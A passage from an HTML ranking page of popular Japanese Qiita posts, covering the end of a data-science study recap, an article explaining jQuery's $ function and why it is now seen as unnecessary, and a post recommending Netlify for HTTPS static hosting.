<span id="スクレイピングクローリング" class="fragment"></span><a href="#%E3%82%B9%E3%82%AF%E3%83%AC%E3%82%A4%E3%83%94%E3%83%B3%E3%82%B0%E3%82%AF%E3%83%AD%E3%83%BC%E3%83%AA%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a>スクレイピング、クローリング</h2>

<p><strong>Pythonによるスクレイピング＆機械学習</strong><br>
<a href="https://camo.qiitausercontent.com/2dab7c00c2cfe3a7f9f3205421cf0e196255d2ae/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f31373361323136352d366538302d303466312d313363332d6133333835343238646235342e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/2dab7c00c2cfe3a7f9f3205421cf0e196255d2ae/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f31373361323136352d366538302d303466312d313363332d6133333835343238646235342e706e67" alt="Pythonスクレイピング＆機械学習.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/148136/173a2165-6e80-04f1-13c3-a3385428db54.png"></a><br>
スクレイピング＆機械学習とあるが、自然言語処理やチャットボット、深層学習等、幅広く触れている１冊。とりあえず技術を経験したい人には良いのではないでしょうか。</p>

<p><strong>Pythonクローリング＆スクレイピング</strong><br>
<a href="https://camo.qiitausercontent.com/b4f6796a9d841515b4a03f983cd9eb3eaa4abd93/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f33663235353863622d626634622d646335652d383035302d3935363837386264623538312e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/b4f6796a9d841515b4a03f983cd9eb3eaa4abd93/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f33663235353863622d626634622d646335652d383035302d3935363837386264623538312e706e67" alt="Pythonクローリング＆スクレイピング.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/148136/3f2558cb-bf4b-dc5e-8050-956878bdb581.png"></a><br>
Webスクレイピング、クローリングを学びたい人にはこちらの方が良いかもしれません。</p>

<h2>
<span id="その他" class="fragment"></span><a href="#%E3%81%9D%E3%81%AE%E4%BB%96"><i class="fa fa-link"></i></a>その他</h2>

<p><strong>RStudioではじめるRプログラミング</strong><br>
<a href="https://camo.qiitausercontent.com/d49e131f0cfc79403f1a3749fbc649c2aeaec265/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f32396138636566652d643232322d343565322d616136392d6565313563363863343336392e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d49e131f0cfc79403f1a3749fbc649c2aeaec265/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f32396138636566652d643232322d343565322d616136392d6565313563363863343336392e706e67" alt="RStudioではじめるRプログラミング入門.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/148136/29a8cefe-d222-45e2-aa69-ee15c68c4369.png"></a><br>
RStudioを使う機会があったので、勉強しました。Rで関数を作る方法等学べます。</p>

<p><strong>これからの強化学習</strong><br>
<a href="https://camo.qiitausercontent.com/136719d2c6d7bb15cbd7bffc2ac4ba0b6a380dc7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f35363961343132322d393938612d393664322d363437342d6134623639313566643731632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/136719d2c6d7bb15cbd7bffc2ac4ba0b6a380dc7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f35363961343132322d393938612d393664322d363437342d6134623639313566643731632e706e67" alt="これからの強化学習.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/148136/569a4122-998a-96d2-6474-a4b6915fd71c.png"></a><br>
学生時代に強化学習をやっていたので購入。<br>
これから読む。</p>

<h1>
<span id="さいごに" class="fragment"></span><a href="#%E3%81%95%E3%81%84%E3%81%94%E3%81%AB"><i class="fa fa-link"></i></a>さいごに</h1>

<p>半年間、データサイエンティストを目指して勉強して思うことは、<strong>決して簡単な分野ではないが、非常におもしろい分野</strong>であるということです。如何に良い仮説を立てられるか、検証結果が仮説を裏付けられているか、次はどこに注目するか、答えのない世界で果てしない試行錯誤は辛いときもありますが、良い結果を出すためにやりがいがあります。</p>

<p>ただ、技術力だけでなくコミュニケーション力も同じくらい重要なのも事実です。「AIが、機械学習が勝手に課題解決してくれる」と思っている人や「とりあえず機械学習で何かやって」という人に<strong>何を分析するのか</strong>を聞き出したり、<strong>分析結果から読み取れること</strong>を説明したり、<strong>次に何をすべきか</strong>を伝える必要があるからです。</p>

<p>「AIで何かやって」という人程、「AIが○○という結果を出しました」という説明に納得しないので、如何に相手を納得させることができるかがポイントになります。コミュニケーション力は<strong>相手に伝えるため</strong>だけでなく<strong>自分の身を守るため</strong>にも必要ではないかと思っています。</p>

<p>以上、半年間のまとめでした。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">31位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>304</kbd>
		<a target="_blank" href="https://qiita.com/ygkn/items/eed01ae9c01339d6086a">jQueryとは何なのか？　なぜ使わなくても（あるいは使わないほうが）いいのか？</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-26<br />23:42:51</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/104663.html">ygkn</a>(28件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/104663/profile-images/1506920149">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[JavaScript]</b> <b>[jQuery]</b> <b>[フロントエンド]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>昨今、よく「jQueryはもう必要ない」という声を聞きます。<br>
しかし、一時期JavaScriptのデファクトスタンダードのライブラリといわれたjQueryに対しての扱いの変化を疑問に思う方もいるでしょう。<br>
そこで、この記事ではそもそもjQueryとは何のために作られたどんなライブラリか、そしてそれがなぜレガシーと呼ばれるようになったのかを学んでいきたいと思います。</p>

<p>間違った事を書いているなどのご指摘は大歓迎です。</p>

<h1>
<span id="なぜ-jquery-ができたのか" class="fragment"></span><a href="#%E3%81%AA%E3%81%9C-jquery-%E3%81%8C%E3%81%A7%E3%81%8D%E3%81%9F%E3%81%AE%E3%81%8B"><i class="fa fa-link"></i></a>なぜ jQuery ができたのか</h1>

<h2>
<span id="昔のweb開発" class="fragment"></span><a href="#%E6%98%94%E3%81%AEweb%E9%96%8B%E7%99%BA"><i class="fa fa-link"></i></a>昔のWeb開発</h2>

<p>jQuery ができたのは2006年。<br>
そのころはJavaScriptはWebページに文章を読むのを妨げる動きをつける言語で、HTML5やCSS3、ES2015なんてものはもちろんなく、今ではコード数行でできることが時にはトリッキーな方法も混ぜながら何十行も書く必要がありました。その上、ECMAによって標準化されているとはいえ、ブラウザが提供していたAPIには差異があり、開発者は常にブラウザ互換についても考えながらコードを書く必要がありました。</p>

<h2>
<span id="jqueryがもたらしたもの" class="fragment"></span><a href="#jquery%E3%81%8C%E3%82%82%E3%81%9F%E3%82%89%E3%81%97%E3%81%9F%E3%82%82%E3%81%AE"><i class="fa fa-link"></i></a>jQueryがもたらしたもの</h2>

<p>そんなWeb開発に革命を起こしたのがjQueryです。<br>
jQueryは各ブラウザが提供しているDOMなどのAPIを一つのメソッドにまとめ、ブラウザ間の差異をなくしました。<br>
それだけじゃなく、Web上でのアニメーションを簡単に記述できたり、現在のJavaScriptの非同期処理に欠かせないPromiseと似たDeferredという機能を取り入れたりもしました。</p>

<p>お世辞にも綺麗とは言えなかったJavaScriptの <code>for</code> 文などを簡潔に書けるユーティリティの機能も存在します。</p>

<p>そしてjQueryの最大の功績はなんと言ってもAjaxを簡潔かつわかりやすく書けることでしょう。<br>
これによりサーバー↔クライアント間の通信がページ転移を伴わないでもできるようになりました。<br>
これは現在のSPA（シングルページアプリケーション）の元となります。</p>

<h1>
<span id="jqueryの仕組み" class="fragment"></span><a href="#jquery%E3%81%AE%E4%BB%95%E7%B5%84%E3%81%BF"><i class="fa fa-link"></i></a>jQueryの仕組み</h1>

<p>jQueryはそのロゴに「write less, do more」とあるようにとても少ない記述量で多くのことができます。<br>
それゆえ、jQueryが実際にしている動作は半ブラックボックス化されているような気もします。<br>
初心者Webプログラマやデザイナー向けの「jQuery入門」と銘打たれた本には「こうしたいときはこう書け」としか書いておらず、それがなぜそう動くのかまで書かれている本はまれです。初心者の中では、jQueryとJavaScriptは別の言語だと思っていたという話も聞きます。<br>
簡単に書けるとは言え、適当に書けば可読性皆無なコードや必要以上に低速なプログラムが生まれてしまいます。</p>

<p>ここでjQueryの動く仕組みを確認してみましょう。</p>

<h2>
<span id="javascriptのおさらい" class="fragment"></span><a href="#javascript%E3%81%AE%E3%81%8A%E3%81%95%E3%82%89%E3%81%84"><i class="fa fa-link"></i></a>JavaScriptのおさらい</h2>

<p>さて、ここでjQueryの仕組みを知る前に、JavaScriptの基本のおさらいをしましょう。<br>
JavaScriptは動的型付けのオブジェクト指向のプログラミング言語です。ですが、関数が第一級オブジェクトであったりと関数型言語としての特徴も併せ持っています。これは、関数が変数に代入でき、関数のプロパティやメソッドを追加できるということです。<br>
こうした柔軟な言語仕様が、jQueryの「write less, do more.」を支えているのです。</p>

<h2>
<span id="" class="fragment"></span><a href="#"><i class="fa fa-link"></i></a>$？</h2>

<p>さて、jQueryの使い方は皆さんご存知の通り、<code>&lt;script&gt;</code>タグでjQueryのソースを読みこみます。<br>
その後、</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$(() =&gt; {
  /* 処理 */
})
</pre></div></div>

<p>と書きます。<br>
この謎の<code>$</code>記号はDOM操作をする時にも現れ、<code>$(セレクタ)</code>のようにしてHTML要素を取得します。<br>
また、POSTやGETなどAjax系の機能や、<code>each()</code>などDOMに関係のない機能を使う時は <code>$.get()</code> のように書き、やっぱり <code>$</code> マークが出てきます。</p>

<p>この記号は一体何なのでしょう。</p>

<p>シェルスクリプトやPHP、Perlなどを学んだことのある人は何か特別な意味のある記号なのかな、と思われるかもしれませんが、JavaScriptでは <code>$</code>、<code>_</code>といった記号は通常のアルファベットや数字などと一緒で変数名に使うことができます。</p>

<p>そう、<code>$</code> とは単なる変数なのです。</p>

<p>では、どんな変数なのでしょう。</p>

<p>ブラウザのJavaScriptコンソールで確かめてみましよう。<br>
jQueryが使われてるサイト<sup id="fnref1"><a href="#fn1" rel="footnote" title="jQuery （公式サイト） とか">1</a></sup>で</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">$</span><span class="p">);</span>
</pre></div></div>

<p>とコンソールに打ってください。</p>

<p><a href="https://camo.qiitausercontent.com/a9cbd2b1913ac46edcb5931baed8c81639412219/68747470733a2f2f64326d787565667165616137736a2e636c6f756466726f6e742e6e65742f735f433830464533454243353433464346334636324542433935434137413942383435353237304331323033373936454444313535324337384637383637324138365f313530383835393636303638365f696d6167652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a9cbd2b1913ac46edcb5931baed8c81639412219/68747470733a2f2f64326d787565667165616137736a2e636c6f756466726f6e742e6e65742f735f433830464533454243353433464346334636324542433935434137413942383435353237304331323033373936454444313535324337384637383637324138365f313530383835393636303638365f696d6167652e706e67" alt="" data-canonical-src="https://d2mxuefqeaa7sj.cloudfront.net/s_C80FE3EBC543FCF3F62EBC95CA7A9B8455270C1203796EDD1552C78F78672A86_1508859660686_image.png"></a></p>

<p>このように表示されたと思います。</p>

<p><strong>そう、 jQuery の <code>$</code> は関数なのです。</strong></p>

<p>この関数の主な働きは、与えられた文字列（セレクタだったりHTMLだったり）を元にjQueryオブジェクトを作ることです<sup id="fnref2"><a href="#fn2" rel="footnote" title='また、$ 関数の引数に関数を与えた場合は、$(document).on("ready", 関数) （DOM木構造が最初に完成したら呼ばれるイベント）のエイリアスになります。'>2</a></sup>。これは何かに似てると思いませんか？　そう、クラスですね。</p>

<p>JavaScriptにおけるクラスのメソッドは <code>クラス.prototype</code> に生えてますが、jQueryオブジェクトの場合はどこにあるのでしょう。</p>

<p>その答えは、<code>$.fn</code> です。</p>

<p><a href="https://camo.qiitausercontent.com/de5be4ed949bab89f46930d20bec65ac01000654/68747470733a2f2f64326d787565667165616137736a2e636c6f756466726f6e742e6e65742f735f433830464533454243353433464346334636324542433935434137413942383435353237304331323033373936454444313535324337384637383637324138365f313530393032313939333034345f696d6167652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/de5be4ed949bab89f46930d20bec65ac01000654/68747470733a2f2f64326d787565667165616137736a2e636c6f756466726f6e742e6e65742f735f433830464533454243353433464346334636324542433935434137413942383435353237304331323033373936454444313535324337384637383637324138365f313530393032313939333034345f696d6167652e706e67" alt="" data-canonical-src="https://d2mxuefqeaa7sj.cloudfront.net/s_C80FE3EBC543FCF3F62EBC95CA7A9B8455270C1203796EDD1552C78F78672A86_1509021993044_image.png"></a></p>

<p>コンソールで見るとこんなかんじです。見慣れたメソッドたちがいっぱいですね。 <code>$(".my-plugin").myPlugin()</code> 系のプラグインはこれをいじってます。</p>

<p>では、 <code>$.get()</code>  などの <code>$</code> に直接生えているのはというと、JavaScriptでは関数はオブジェクトであることを思い出してください。オブジェクトなのでそこにメソッドを生やせるということです。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ ()→ jQueryオブジェクト ┌&gt; .addClass()
├ .getJSON()           │  .animate()
├ .each()              │  .data()
├ .isArray()           │  ：
│：                    │
└ .fn ─────────────────┘
</pre></div></div>

<p>さて、ではなぜ <code>$</code> 一つに全ての機能をまとめているのでしょう<sup id="fnref3"><a href="#fn3" rel="footnote" title="Prototype.js など、他の $ 変数を使うライブラリと競合した時のために、jQueryという変数でも $ にアクセスできるようになってます。">3</a></sup>。</p>

<p>Webブラウザ上のJavaScriptではモジュール機能は実用的なレベルではありません。その上、jQueryができた当初は<a href="http://browserify.org/" rel="nofollow noopener" target="_blank">Browserify</a>や<a href="https://webpack.js.org/" rel="nofollow noopener" target="_blank">webpack</a>、<a href="https://rollupjs.org/" rel="nofollow noopener" target="_blank">Rollup</a>といったモジュールバンドラーもありませんでした。</p>

<p>そこで、jQuery含む多くのライブラリはそれぞれのライブラリごとにグルーバル変数に関数などを定義していました。そこで、グローバルには何か一つオブジェクトを置いておき、そこに自身のライブラリの関数を生やしていく、という方法が採られました。</p>

<h1>
<span id="そしてその後のweb事情" class="fragment"></span><a href="#%E3%81%9D%E3%81%97%E3%81%A6%E3%81%9D%E3%81%AE%E5%BE%8C%E3%81%AEweb%E4%BA%8B%E6%83%85"><i class="fa fa-link"></i></a>そして、その後のWeb事情</h1>

<h2>
<span id="モダンなwebをめざして" class="fragment"></span><a href="#%E3%83%A2%E3%83%80%E3%83%B3%E3%81%AAweb%E3%82%92%E3%82%81%E3%81%96%E3%81%97%E3%81%A6"><i class="fa fa-link"></i></a>モダンなWebをめざして</h2>

<p>その後、Web開発事情は大きく変化しました。</p>

<p>先程申し上げたサーバー↔クライアント間の通信により、Webアプリはサーバー主体から重きをクライアントに移し、より効率のよいWebフロントエンドの開発方法が求められ、Node.jsというサーバーで動くJavaScriptの開発もその後を押し、JavaScriptはもはや簡単なDOM操作を行うだけの言語ではなくなりました。</p>

<p>周りを取り巻く環境だけでなく、HTML/CSS/JavaScript自身も進化していき、jQueryでやっと実現できた機能がブラウザ側でサポートしていきます。</p>

<h2>
<span id="ライブラリフレームワーク戦国時代" class="fragment"></span><a href="#%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E3%83%95%E3%83%AC%E3%83%BC%E3%83%A0%E3%83%AF%E3%83%BC%E3%82%AF%E6%88%A6%E5%9B%BD%E6%99%82%E4%BB%A3"><i class="fa fa-link"></i></a>ライブラリ/フレームワーク戦国時代</h2>

<p>そして、肥大化していくクライアントサイドを処理するのに、Backbone.jsを皮切りに、Angular、React、Vue、Riotなど様々なライブラリが登場します。</p>

<p>そして、モダンなライブラリの代名詞とも言える仮想DOMという概念がこれまでのJavaScriptの常識を覆しました。</p>

<p>すると、DOM操作をすることは少なくなり、jQueryの時代はもう終わったのではないかという声が出てきました。</p>

<h1>
<span id="jqueryはいらない子" class="fragment"></span><a href="#jquery%E3%81%AF%E3%81%84%E3%82%89%E3%81%AA%E3%81%84%E5%AD%90"><i class="fa fa-link"></i></a>jQueryはいらない子？</h1>

<h2>
<span id="なぜ使わなくてもあるいは使わないほうがいいのか" class="fragment"></span><a href="#%E3%81%AA%E3%81%9C%E4%BD%BF%E3%82%8F%E3%81%AA%E3%81%8F%E3%81%A6%E3%82%82%E3%81%82%E3%82%8B%E3%81%84%E3%81%AF%E4%BD%BF%E3%82%8F%E3%81%AA%E3%81%84%E3%81%BB%E3%81%86%E3%81%8C%E3%81%84%E3%81%84%E3%81%AE%E3%81%8B"><i class="fa fa-link"></i></a>なぜ使わなくても（あるいは使わないほうが）いいのか？</h2>

<p>jQueryは必要ないと考られる理由はいくつかあります。</p>

<p>jQueryはたくさんのブラウザの挙動を標準化するのをJavaScriptでブラウザのAPIを無視し、新しくjQueryオブジェクトというものを定義し、１からメソッドを追加することで実現しています。<br>
この方法は、ブラウザ間の挙動の統一が取れてなかったころは都合がよかったのですが、今では逆に車輪の再発明をしてしまうことになり、パフォーマンス的にもよくないです。</p>

<p>そして、jQueryはできた時のWeb事情に合わせて作られている（当たり前ですが）ので今のWeb事情とか合わないという点もあります。</p>

<p>また、外部のライブラリを使うとなると埋め込み方法やバージョン管理にもリソースを使う必要があります。</p>

<p>もし、例えばスムーズスクロールなどライブラリを必要とする場合でも、jQueryの他にその機能だけを担う別の<a href="https://tsuyoshiwada.github.io/sweet-scroll/" rel="nofollow noopener" target="_blank">sweet-scroll</a>などのライブラリを使えばいいだけです。わざわざ使わない機能がついたjQueryを使う必要はありません。</p>

<p>IEなど古いブラウザをサポートしなければいけないときは、APIをECMAScriptで定められた挙動に再現してくれる<a href="https://babeljs.io/" rel="nofollow noopener" target="_blank">Babel</a>とPolyfillを使いましょう。</p>

<p>jQueryを使ったプラグインは、たいていjQueryを使わないライブラリがあります。探してみましょう。</p>

<p><code>$</code> を使ってDOMオブジェクトを取得したいときは、</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">$</span> <span class="o">=</span> <span class="p">(...</span><span class="nx">s</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelectorAll</span><span class="p">(...</span><span class="nx">s</span><span class="p">)</span>
</pre></div></div>

<p>とすればいいです。</p>

<h2>
<span id="jqueryはクソライブラリ" class="fragment"></span><a href="#jquery%E3%81%AF%E3%82%AF%E3%82%BD%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA"><i class="fa fa-link"></i></a>jQueryはクソライブラリ？</h2>

<p>ここまで読むとjQueryをディスってるように聞こえますが、jQueryは素晴らしいライブラリだと思います。<br>
jQueryは黎明を支えてきたライブラリです。</p>

<p>ブラウザ標準のAPIにはjQueryから着想を得たものがたくさんありますし、Ajaxをあれほど簡単に書けなければSPAという概念が生まれることもなかったかもしれません。</p>

<p>jQueryが果たした功績は大きいですが、もう役割は終わったと、そう感じています。</p>

<h1>
<span id="参考" class="fragment"></span><a href="#%E5%8F%82%E8%80%83"><i class="fa fa-link"></i></a>参考</h1>

<p><a href="https://jquery.com/" rel="nofollow noopener" target="_blank">jQuery （公式サイト）</a><br>
<a href="https://ja.wikipedia.org/wiki/JQuery" rel="nofollow noopener" target="_blank">jQuery - Wikipedia</a></p>

<div class="footnotes">
<hr>
<ol>

<li id="fn1">
<p><a href="https://jquery.com/" rel="nofollow noopener" target="_blank">jQuery （公式サイト）</a> とか <a href="#fnref1">↩</a></p>
</li>

<li id="fn2">
<p>また、<code>$</code> 関数の引数に関数を与えた場合は、<code>$(document).on(</code><code>"</code><code>ready</code><code>"</code><code>, 関数)</code> （DOM木構造が最初に完成したら呼ばれるイベント）のエイリアスになります。 <a href="#fnref2">↩</a></p>
</li>

<li id="fn3">
<p><a href="http://prototypejs.org/" rel="nofollow noopener" target="_blank">Prototype.js</a> など、他の <code>$</code> 変数を使うライブラリと競合した時のために、<code>jQuery</code>という変数でも <code>$</code> にアクセスできるようになってます。<a href="https://camo.qiitausercontent.com/5137d5e4885af350767cad37824906756561b57f/68747470733a2f2f64326d787565667165616137736a2e636c6f756466726f6e742e6e65742f735f433830464533454243353433464346334636324542433935434137413942383435353237304331323033373936454444313535324337384637383637324138365f313530393032343636343133355f696d6167652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5137d5e4885af350767cad37824906756561b57f/68747470733a2f2f64326d787565667165616137736a2e636c6f756466726f6e742e6e65742f735f433830464533454243353433464346334636324542433935434137413942383435353237304331323033373936454444313535324337384637383637324138365f313530393032343636343133355f696d6167652e706e67" alt="" data-canonical-src="https://d2mxuefqeaa7sj.cloudfront.net/s_C80FE3EBC543FCF3F62EBC95CA7A9B8455270C1203796EDD1552C78F78672A86_1509024664135_image.png"></a> <a href="#fnref3">↩</a></p>
</li>

</ol>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">32位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>295</kbd>
		<a target="_blank" href="https://qiita.com/shogomuranushi/items/6ab5bc29923b3f82c9ed">HTTPSの静的コンテンツをホストするならs3よりNetlifyが俺の求めていたものだった</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-26<br />19:34:06</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/75573.html">shogomuranushi</a>(16件の記事)<br />(ABEJA, Inc. 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/75573/profile-images/1473700199">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[GitHub]</b> <b>[AWS]</b> <b>[S3]</b> <b>[Netlify]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="事の発端" class="fragment"></span><a href="#%E4%BA%8B%E3%81%AE%E7%99%BA%E7%AB%AF"><i class="fa fa-link"></i></a>事の発端</h1>

<p>社内から静的コンテンツをホストしてHTTPS使える環境が欲しいんだよねー。と要望を受けた。<br>
私はAWSが得意なので考えた。</p>

<p>「静的コンテンツならs3か」<br>
「s3でHTTPSならs3の前段にCloudFrontでSSL証明書入れるか（ちょっと面倒だな）」<br>
「CloudFrontにSSL入れるなら無料のACMだな」<br>
「ACM使うならメール認証だしSES要るな（面倒くせぇ）」<br>
「SESでメール受信するならs3・・・・・・・・・・」</p>

<h3>
<span id="ガシャーンちゃぶ台の音" class="fragment"></span><a href="#%E3%82%AC%E3%82%B7%E3%83%A3%E3%83%BC%E3%83%B3%E3%81%A1%E3%82%83%E3%81%B6%E5%8F%B0%E3%81%AE%E9%9F%B3"><i class="fa fa-link"></i></a>ガシャーン！（ちゃぶ台の音）</h3>

<h3>
<span id="俺がしたいのはこれじゃない感" class="fragment"></span><a href="#%E4%BF%BA%E3%81%8C%E3%81%97%E3%81%9F%E3%81%84%E3%81%AE%E3%81%AF%E3%81%93%E3%82%8C%E3%81%98%E3%82%83%E3%81%AA%E3%81%84%E6%84%9F"><i class="fa fa-link"></i></a>「俺がしたいのはこれじゃない感」</h3>

<h1>
<span id="ということで" class="fragment"></span><a href="#%E3%81%A8%E3%81%84%E3%81%86%E3%81%93%E3%81%A8%E3%81%A7"><i class="fa fa-link"></i></a>ということで</h1>

<p>何か上の環境を一発で作れるツールあるかなぁ。と調べているとNetlifyというサービスが引っかかった。</p>

<h1>
<span id="netlifyってなに" class="fragment"></span><a href="#netlify%E3%81%A3%E3%81%A6%E3%81%AA%E3%81%AB"><i class="fa fa-link"></i></a>Netlifyってなに？</h1>

<p>どうも静的コンテンツをホストしてくれて、SSLが使えるとな。Githubと連携して？<br>
ふむふむ。使ってみよう。</p>

<p>ということでGithubにリポジトリを作って5分位でデプロイ出来る環境が出来ました。<br>
SSLとDNSも5分位で設定完了。</p>

<h3>
<span id="俺が求めていたものはこれだった" class="fragment"></span><a href="#%E4%BF%BA%E3%81%8C%E6%B1%82%E3%82%81%E3%81%A6%E3%81%84%E3%81%9F%E3%82%82%E3%81%AE%E3%81%AF%E3%81%93%E3%82%8C%E3%81%A0%E3%81%A3%E3%81%9F"><i class="fa fa-link"></i></a>「俺が求めていたものはこれだった」</h3>

<h1>
<span id="netlifyの紹介検索したら色々出てくるけど" class="fragment"></span><a href="#netlify%E3%81%AE%E7%B4%B9%E4%BB%8B%E6%A4%9C%E7%B4%A2%E3%81%97%E3%81%9F%E3%82%89%E8%89%B2%E3%80%85%E5%87%BA%E3%81%A6%E3%81%8F%E3%82%8B%E3%81%91%E3%81%A9"><i class="fa fa-link"></i></a>Netlifyの紹介(検索したら色々出てくるけど)</h1>

<h2>
<span id="url" class="fragment"></span><a href="#url"><i class="fa fa-link"></i></a>URL</h2>

<p><a href="https://www.netlify.com/" class="autolink" rel="nofollow noopener" target="_blank">https://www.netlify.com/</a></p>

<h2>
<span id="ほどんどのことが無料" class="fragment"></span><a href="#%E3%81%BB%E3%81%A9%E3%82%93%E3%81%A9%E3%81%AE%E3%81%93%E3%81%A8%E3%81%8C%E7%84%A1%E6%96%99"><i class="fa fa-link"></i></a>ほどんどのことが無料</h2>

<ul>
<li>商用利用可</li>
<li>カスタムドメインのHTTP</li>
<li>CIによるデプロイ</li>
<li>フォーム処理</li>
<li>A/Bテスト</li>
<li>コミュニティサポート</li>
<li>etc...</li>
</ul>

<h2>
<span id="有料版で出来ること" class="fragment"></span><a href="#%E6%9C%89%E6%96%99%E7%89%88%E3%81%A7%E5%87%BA%E6%9D%A5%E3%82%8B%E3%81%93%E3%81%A8"><i class="fa fa-link"></i></a>有料版で出来ること</h2>

<ul>
<li>チームや複数レベルの管理機能</li>
<li>メールとチャットのサポート</li>
<li>SOC2準拠</li>
<li>などその他色々</li>
</ul>

<h2>
<span id="デプロイ" class="fragment"></span><a href="#%E3%83%87%E3%83%97%E3%83%AD%E3%82%A4"><i class="fa fa-link"></i></a>デプロイ</h2>

<ul>
<li>Git系リポジトリと簡単に連動しpushするだけでデプロイ可能</li>
</ul>

<h2>
<span id="dns" class="fragment"></span><a href="#dns"><i class="fa fa-link"></i></a>DNS</h2>

<ul>
<li>任意のDNSでも、NetlifyのDNSでも可</li>
</ul>

<h2>
<span id="ssl証明書" class="fragment"></span><a href="#ssl%E8%A8%BC%E6%98%8E%E6%9B%B8"><i class="fa fa-link"></i></a>SSL証明書</h2>

<ul>
<li>無料(Let's Encrypt)</li>
<li>カスタムドメインも1ボタンで発行</li>
</ul>

<h2>
<span id="パフォーマンス" class="fragment"></span><a href="#%E3%83%91%E3%83%95%E3%82%A9%E3%83%BC%E3%83%9E%E3%83%B3%E3%82%B9"><i class="fa fa-link"></i></a>パフォーマンス</h2>

<ul>
<li>自動でCDN付き</li>
<li>スケーラブルらしい（静的コンテンツだけだもんね）</li>
</ul>

<h2>
<span id="abテストbeta" class="fragment"></span><a href="#ab%E3%83%86%E3%82%B9%E3%83%88beta"><i class="fa fa-link"></i></a>ABテスト(BETA)</h2>

<ul>
<li>ワンクリックでGitのブランチ毎にABテストが出来る</li>
</ul>

<h2>
<span id="フォーム" class="fragment"></span><a href="#%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0"><i class="fa fa-link"></i></a>フォーム</h2>

<ul>
<li>フォームはHTMLで作れる</li>
<li>データベース不要</li>
<li>メール、Slack、Webhookへ通知可能</li>
</ul>

<h2>
<span id="セキュリティ" class="fragment"></span><a href="#%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3"><i class="fa fa-link"></i></a>セキュリティ</h2>

<ul>
<li>有料版ではSOC2取ってるくらいだから強そう</li>
<li>基本静的コンテンツだけだからよっぽどじゃないと問題にならない？</li>
</ul>

<h2>
<span id="ちょっとした機能" class="fragment"></span><a href="#%E3%81%A1%E3%82%87%E3%81%A3%E3%81%A8%E3%81%97%E3%81%9F%E6%A9%9F%E8%83%BD"><i class="fa fa-link"></i></a>ちょっとした機能</h2>

<ul>
<li>デプロイ履歴とログが残る</li>
</ul>

<h3>
